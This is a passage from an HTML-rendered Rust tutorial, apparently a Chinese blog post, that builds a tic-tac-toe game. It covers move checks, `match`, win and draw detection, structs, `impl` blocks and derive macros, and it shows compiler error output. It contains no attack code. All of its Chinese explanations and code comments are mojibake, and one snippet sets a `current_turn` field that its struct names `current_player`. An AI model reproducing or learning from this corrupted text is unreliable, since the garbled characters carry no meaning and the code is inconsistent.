class="comment">// å…ˆæ£€éªŒèŒƒå›´ï¼Œä¿è¯åªèƒ½æ˜¯0, 1, 2</span></span><br><span class="line">    <span class="comment">// è¶…å‡ºæ£‹ç›˜èŒƒå›´æˆ–è€…è¯¥å¤„å·²ç»è½å­äº†ï¼Œå°±ä»£è¡¨è¿™ä¸€æ­¥ä¸æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span> row &gt;= <span class="number">3</span> || col &gt;= <span class="number">3</span> || board[row][col] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        board[row][col] = symbol;</span><br><span class="line">        <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  è¿™é‡Œå¾—è¯´æ˜ä¸€ä¸‹ï¼Œæ¯ä¸ªä½œç”¨åŸŸçš„æœ€åä¸€ä¸ªè¡¨è¾¾å¼å°±ä¼šä½œä¸ºè¿”å›å€¼ï¼Œè¿™é‡Œon_moveå‡½æ•°åªæœ‰ä¸€ä¸ªè¡¨è¾¾å¼ï¼ˆæœ€åä¸€å¥ä¸è¦æœ‰åˆ†å·ï¼Œæœ‰åˆ†å·å°±æ˜¯è¯­å¥ï¼Œè¯­å¥æ²¡æœ‰è¿”å›å€¼ï¼Œæˆ–è€…å‡†ç¡®æ¥è¯´è¯­å¥è¿”å›ä¸€ä¸ªå•å…ƒ<code>()</code> )ï¼Œå°±æ˜¯if {} else {}ï¼Œç„¶åifå’Œelseé‡Œé¢åˆ†åˆ«æœ‰falseå’Œtrueä½œä¸ºè¿”å›å€¼ã€‚</p><p>  <strong>æ³¨æ„æ¯ä¸ªè¯­å¥å—åªæœ‰æœ€åä¸€è¡Œæ‰èƒ½ä¸å†™åˆ†å·ï¼Œåƒæ˜¯ifï¼Œ forï¼Œå‡½æ•°ï¼Œæˆ–è€…ä»…ä»…åªæ˜¯{} åŒ…è£¹çš„å†…å®¹å°±æ˜¯ä¸€ä¸ªè¯­å¥å—ã€‚å½“ç„¶è¯­å¥å—ä¹Ÿæ˜¯ä¸€ä¸ªè¯­å¥</strong></p><p>  è€Œreturnå¾€å¾€ç”¨äºä¸€ä¸ªå‡½æ•°çš„ä¸­é—´ï¼Œä¼šç›´æ¥è·³å‡ºè¿™ä¸ªå‡½æ•°å¹¶è¿”å›å€¼ã€‚</p><p>  è¿™æ ·çš„å¥½å¤„æ˜¯ä¸ç”¨å†™returnï¼ˆPSï¼šæœ¬äººæ¯”è¾ƒå€¾å‘äºä¸å†™returnï¼Œä¸€èˆ¬ä¸æ˜¯è¿«ä¸å¾—å·²æˆ‘ä¸ä¼šå†™returnï¼‰</p></blockquote><p>ç„¶åæˆ‘ä»¬å¾—å¤„ç†ä¸€ä¸‹on_moveçš„ç»“æœ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !<span class="title function_ invoke__">on_move</span>(&amp;<span class="keyword">mut</span> board, row, col, current_player) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Invalid move!&quot;</span>);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ¯ä¸ªäººè½å­æˆåŠŸå°±è½®åˆ°ä¸‹ä¸€ä¸ªç©å®¶ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªnext_playeræ¥è½®æ¢ç©å®¶ï¼Œä½ å¯èƒ½ä¼šæƒ³å†™ä¸ªifï¼Œelse ifå¥½äº†ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬ç”¨matchæ¥æ›´ä¼˜é›…çš„å®ç°</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> !<span class="title function_ invoke__">on_move</span>(...) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        current_player = <span class="title function_ invoke__">next_player</span>(current_player);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">next_player</span>(symbol: <span class="type">char</span>) <span class="punctuation">-&gt;</span> <span class="type">char</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> symbol &#123;</span><br><span class="line">        <span class="string">&#x27;X&#x27;</span> =&gt; <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;O&#x27;</span> =&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        _ =&gt; <span class="built_in">unreachable!</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯èƒ½è·ŸCçš„switchå¾ˆåƒï¼Œä¸è¿‡matchçš„å¼ºå¤§è¿˜è¿œè¿œä¸æ­¢è¿™äº›ï¼Œmatchæœ‰ä¸ªå¤§æ€å™¨å°±æ˜¯æ¨¡å¼åŒ¹é…ï¼ˆæ²¡é”™ï¼Œåˆæ˜¯ä»å‡½æ•°å¼è¯­è¨€å€Ÿé‰´çš„ï¼šDï¼‰ï¼Œä¼šåœ¨åç»­å†…å®¹ç»†å—¦ã€‚</p><blockquote><p>  é¡ºå¸¦ä¸€æï¼Œåœ¨Rusté‡Œé¢ï¼Œ<strong>æ— è®ºæ˜¯å‡½æ•°è¿˜æ˜¯å…¨å±€å˜é‡ï¼Œæˆ–è€…æ˜¯ç»“æ„ä½“ç­‰çš„å®šä¹‰ï¼Œåªè¦æœ‰å®šä¹‰å°±è¡Œäº†ï¼Œä¸éœ€è¦å¤ªå…³æ³¨ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ ä¸å¿…åƒC&#x2F;Cppä¸€æ ·å¾—å…ˆåœ¨mainå‰é¢å£°æ˜æŸä¸ªå‡½æ•°ï¼Œæ‰èƒ½åœ¨mainåé¢å†™å‡½æ•°çš„å…·ä½“å®ç°ã€‚</strong></p></blockquote><h3 id="Win-or-Draw"><a href="#Win-or-Draw" class="headerlink" title="Win or Draw"></a>Win or Draw</h3><p>ç°åœ¨è·ç¦»ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„æ¸¸æˆåªå·®èƒœè´Ÿåˆ¤æ–­äº†ï¼Œæˆ‘ä»¬å¾—å†™ä¸€ä¸ªis_winå‡½æ•°æ¥å†æ¯æ¬¡è½å­ååˆ¤æ–­æ˜¯å¦æœ‰äººèƒœåˆ©ï¼ˆwinï¼‰ï¼Œç„¶åè¿˜å¾—å†™ä¸€ä¸ªå‡½æ•°is_fullæ¥åˆ¤æ–­æ£‹ç›˜æ—¶å€™å·²ç»ä¸‹æ»¡äº†ï¼Œä¹Ÿå°±æ„å‘³ç€å¹³å±€ï¼ˆdrawï¼‰ï¼Œå½“ç„¶è¿™ä¸ªå‡½æ•°å¾—æ”¾åœ¨is_winåé¢è°ƒç”¨ï¼šDï¼Œ æœ€ååœ¨loopé‡Œé¢è°ƒç”¨å³å¯</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">is_win</span>(&amp;board) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; win!&quot;</span>, current_player);</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">// æˆ–è€… return;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">is_full</span>(&amp;board) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;Draw!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ä¿è¯ä¸Šä¸€æ­¥ä¸‹å®Œæ—¢æ²¡æœ‰äººwinï¼Œä¹Ÿæ²¡æœ‰ä¸‹æ»¡æ£‹ç›˜ï¼Œæ‰èƒ½è½®åˆ°ä¸‹ä¸€æ‰‹</span></span><br><span class="line">        current_player = <span class="title function_ invoke__">next_player</span>(current_player);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">is_win</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">// è¡Œ</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> board &#123;</span><br><span class="line">        <span class="keyword">if</span> row[<span class="number">0</span>] == row[<span class="number">1</span>] &amp;&amp; row[<span class="number">1</span>] == row[<span class="number">2</span>] &amp;&amp; row[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ—</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> board[<span class="number">0</span>][col] == board[<span class="number">1</span>][col] &amp;&amp; board[<span class="number">1</span>][col] == board[<span class="number">2</span>][col] &amp;&amp; board[<span class="number">0</span>][col] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¯¹è§’çº¿</span></span><br><span class="line">    <span class="keyword">if</span> board[<span class="number">0</span>][<span class="number">0</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> board[<span class="number">0</span>][<span class="number">2</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">2</span>] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">is_full</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> board &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> row &#123;</span><br><span class="line">            <span class="keyword">if</span> *col == <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Okï¼ŒåŸºæœ¬çš„åŠŸèƒ½å·²ç»åŸºæœ¬å®ç°äº†ï¼Œå¯ä»¥è¿è¡Œç©ä¸€ç©ã€‚è¿™èŠ‚å†…å®¹å…¶å®æ²¡æœ‰æ¶‰åŠå¤šå°‘RustçœŸæ­£æ·±å…¥çš„éƒ¨åˆ†ï¼Œä¸Šé¢é—ç•™çš„å¾ˆå¤šé—®é¢˜<del>ï¼ˆæŒ–çš„å¾ˆå¤šå‘ï¼‰</del>ï¼Œä¼šåœ¨ä¸‹ä¸€èŠ‚è§£ç­”ï¼Œä¸‹ä¸€èŠ‚ä¹Ÿä¼šé€æ¸å¸¦ä½ è®¤è¯†rustä¸€äº›çœŸæ­£å¸å¼•äººçš„ç‰¹æ€§ã€‚</p><h1 id="Improve-your-Rust-code"><a href="#Improve-your-Rust-code" class="headerlink" title="Improve your Rust code"></a>Improve your Rust code</h1><p>ç›¸ä¿¡å¤§ä½¬ä»¬çœ‹äº†ä¸Šé¢çš„å¾ˆä¸å°½å…´å§ï¼Œ<del>æˆ‘æƒ³è¦çœ‹Rustç‹¬ç‰¹çš„ç‰¹æ€§ï¼ˆéœ‡å£°</del>ï¼Œåˆ«æ€¥ï¼Œæœ¬èŠ‚ä¼šç»™å‡ºä¸€ä¸ªç­”å¤ã€‚</p><h2 id="ä½¿ç”¨structå°è£…"><a href="#ä½¿ç”¨structå°è£…" class="headerlink" title="ä½¿ç”¨structå°è£…"></a>ä½¿ç”¨structå°è£…</h2><p>æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªGameç»“æ„ä½“ï¼Œæ¥è®°å½•ä¸€äº›æ¸¸æˆå±æ€§ã€‚</p><p>åœ¨rustä¸­ï¼Œå®šä¹‰ç»“æ„ä½“å’ŒCæ˜¯ç±»ä¼¼çš„ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    board: [<span class="type">char</span>; <span class="number">9</span>],</span><br><span class="line">    players: [<span class="type">char</span>; <span class="number">2</span>],</span><br><span class="line">    current_player: <span class="type">usize</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åŸæ¥çš„ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬æ˜¯ä½¿ç”¨Xå’ŒOæ¥ä»£æ›¿ç©å®¶ï¼Œä½†æ˜¯è¿™æ ·å¤ªè‰ç‡äº†ï¼Œå¾ˆå¤šè¯»è€…è‚¯å®šä¸ä¼šä¹°è´¦çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªPlayerç»“æ„ä½“ï¼Œå‚¨å­˜åå­—å’Œå¯¹åº”çš„ç¬¦å·</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    symbol: <span class="type">char</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶å‰é¢çš„Gameçš„playersçš„ç±»å‹ä¹Ÿè¦åšç›¸åº”çš„ä¿®æ”¹ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå°è£…é€»è¾‘å‘¢ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥åƒå…¶ä»–è¯­è¨€çš„classä¸€æ ·ä¸ºåˆ›å»ºçš„ç»“æ„ä½“å®šä¹‰ä¸€ç»„æ–¹æ³•çš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨impl ï¼ˆimplementï¼‰å…³é”®å­—ä¸ºä¸€ä¸ªstructå®šä¹‰ä¸€ç»„æˆ–å¤šç»„å®ç°</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Game &#123;</span><br><span class="line">        Game &#123;</span><br><span class="line">            board: [<span class="string">&#x27; &#x27;</span>; <span class="number">9</span>],</span><br><span class="line">            players: [Player::<span class="title function_ invoke__">new</span>(); <span class="number">2</span>],</span><br><span class="line">            current_turn: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Player &#123;</span><br><span class="line">        Player &#123;</span><br><span class="line">            name: <span class="string">&quot;Test Player&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            symbol: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨mainé‡Œåˆ›å»ºä¸€ä¸ªGameè¯•è¯•ï¼Œ</p><blockquote><p>  ä¼šå‘ç°çˆ†äº†ä¸€ä¸ªé”™è¯¯</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Compiling playground v0.<span class="number">0.1</span> (/playground)</span><br><span class="line">error[<span class="type">E0277</span>]: the trait bound `Player: <span class="built_in">Copy</span>` is not satisfied</span><br><span class="line">  <span class="literal">--</span>&gt; src/main.rs:<span class="number">21</span>:<span class="number">23</span></span><br><span class="line">   |</span><br><span class="line"><span class="number">21</span> |             players: [<span class="type">Player</span>::<span class="type">new</span>(); <span class="number">2</span>],</span><br><span class="line">   |                       ^^^^^^^^^^^^^ the trait `Copy` is not implemented <span class="keyword">for</span> `Player`</span><br><span class="line">   |</span><br><span class="line">   = note: the `Copy` trait is required because this value will be copied <span class="keyword">for</span> each element of the array</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0277`.</span><br><span class="line">error: could not compile `playground` (bin <span class="string">&quot;playground&quot;</span>) due to previous error</span><br></pre></td></tr></table></figure><p>  è¿™ä¸ªåœ¨å‰é¢è¯´è¿‡ï¼Œæ˜¯ç”±äºæ²¡æœ‰å®ç°Copyç‰¹å¾ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•é€šè¿‡æ´¾ç”Ÿå®æ¥å¿«é€Ÿå®ç°ä¸€ä¸ªç‰¹å¾</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Copy)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å‘ç°è¿˜æ˜¯æŠ¥é”™äº†</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Compiling playground v0.<span class="number">0.1</span> (/playground)</span><br><span class="line">error[<span class="type">E0204</span>]: the trait `Copy` cannot be implemented <span class="keyword">for</span> this <span class="built_in">type</span></span><br><span class="line">  <span class="literal">--</span>&gt; src/main.rs:<span class="number">11</span>:<span class="number">10</span></span><br><span class="line">   |</span><br><span class="line"><span class="number">11</span> | <span class="comment">#[derive(Copy)]</span></span><br><span class="line">   |          ^^^^</span><br><span class="line"><span class="number">12</span> | struct Player &#123;</span><br><span class="line"><span class="number">13</span> |     name: String,</span><br><span class="line">   |     <span class="literal">------------</span> this field does not implement `Copy`</span><br><span class="line">   |</span><br><span class="line">   = note: this error originates <span class="keyword">in</span> the derive macro `Copy` (<span class="keyword">in</span> Nightly builds, run with <span class="literal">-Z</span> macro<span class="literal">-backtrace</span> <span class="keyword">for</span> more info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0204`.</span><br><span class="line">error: could not compile `playground` (bin <span class="string">&quot;playground&quot;</span>) due to previous error</span><br></pre></td></tr></table></figure><p>  ç”±äºPlayeré‡Œé¢åŒ…å«äº†Stringï¼Œæ‰€ä»¥ä¸èƒ½ä¸ºPlayerå®ç°Copyç‰¹å¾ï¼Œè¿™æ˜¯å› ä¸ºæ•°æ®åœ¨å †ä¸Šï¼Œä¸èƒ½å¿«é€Ÿæ‹·è´ï¼Œæ‰€ä»¥æ— æ³•å®ç°Copyï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ç”¨è¿™ä¸ª[xxx; n] çš„æ ¼å¼æ¥å¿«é€Ÿç”Ÿæˆäº†ï¼Œå…¶å®è¿™æ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œå½“æ•°æ®é•¿åº¦æ¯”è¾ƒå¤§ï¼Œç”¨è¿™ä¸ªå°±å¾ˆæ–¹ä¾¿ï¼Œå½“ç„¶æˆ‘ä»¬åªèƒ½é‡‡ç”¨æœ€æ™®é€šçš„æ–¹æ³•ï¼š <code>[Player::new(), Player::new()]</code>ï¼Œ å°±æ˜¯æœ‰å‡ ä¸ªå°±å†™å‡ éï¼Œæˆ–è€…ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªç©ºçš„Vecåé¢åœ¨pushä¸¤ä¸ªPlayerè¿›å»ã€‚</p></blockquote><p>æ”¹å¥½åæˆ‘ä»¬å¯ä»¥è¾“å‡ºä¸€ä¸‹Gameçš„ä¿¡æ¯çœ‹çœ‹ã€‚</p><p>å¦‚æœä½ ä¹ æƒ¯å†™Cï¼Œå¯èƒ½ä¼šæƒ³è¦ä¾æ¬¡è®¿é—®æ¯ä¸ªæˆå‘˜ï¼Œå†è¾“å‡ºï¼Œåœ¨rusté‡Œå½“ç„¶å¯ä»¥ï¼Œä¸è¿‡æ›´åŠ ä¼˜é›…çš„æ–¹å¼æ˜¯ä¸ºè¯¥ç»“æ„ä½“å®ç°ä¸€ä¸ªDebugç‰¹å¾</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„#[derive()]æ˜¯ä¸€ä¸ªæ´¾ç”Ÿå®ï¼Œå¯ä»¥å¿«é€Ÿå®ç°æŸäº›ç‰¹å¾ï¼Œå½“ç„¶å¦‚æœæƒ³è¦è‡ªå®šä¹‰æ•ˆæœï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨å®ç°è¯¥ç‰¹å¾ã€‚é€šè¿‡æ´¾ç”Ÿå®æ¥å®ç°çš„ä¸€ä¸ªæ¡ä»¶æ˜¯å¿…é¡»æ¯ä¸ªæˆå‘˜éƒ½å®ç°äº†è¯¥ç‰¹å¾ï¼Œå› ä¸ºGameé‡Œé¢æœ‰æˆå‘˜çš„ç±»å‹åŒ…å«äº†Playerï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ç»™Playerä¹Ÿå®ç°Debugï¼Œç”±äºPlayeré‡Œé¢çš„Stringå’Œcharæ˜¯é»˜è®¤å®ç°äº†è¯¥ç‰¹å¾ï¼Œæ‰€ä»¥Playeræ‰èƒ½å®ç°Debugï¼Œåƒå‰é¢Copyç‰¹å¾æ­£æ˜¯ç”±äºStringåœ¨å †ä¸Šï¼Œä¸èƒ½å®ç°Copyï¼Œå¯¼è‡´Playerä¹Ÿä¸èƒ½å®ç°Copyç‰¹å¾ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">game</span> = Game::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, &amp;game);</span><br><span class="line">    <span class="comment">// æˆ–è€…é€‰æ‹©æ›´å¥½çš„è¾“å‡ºæ–¹å¼</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:#?&#125;&quot;</span>, &amp;game);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Game &#123; board: [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>], players: [<span class="type">Player</span> &#123; <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>, <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span> &#125;, <span class="type">Player</span> &#123; <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>, <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span> &#125;], current_player: <span class="number">0</span> &#125;</span><br><span class="line">Game &#123;</span><br><span class="line">    board: [</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; 